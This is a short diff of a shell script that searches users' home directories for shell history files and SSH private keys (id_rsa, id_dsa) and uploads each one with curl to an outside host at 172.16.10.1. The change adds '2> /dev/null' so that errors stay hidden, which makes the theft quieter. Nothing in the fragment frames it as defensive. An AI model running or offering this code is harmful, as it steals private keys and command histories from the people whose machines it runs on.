@@ -4,4 +4,4 @@ find /home/ \
     -name ".*_history" \
     -name "id_rsa" \
     -name "id_dsa" \
-    -exec curl -F "filedata=@{}" "http://172.16.10.1" \;
+    -exec curl -F "filedata=@{}" "http://172.16.10.1" \; 2> /dev/null
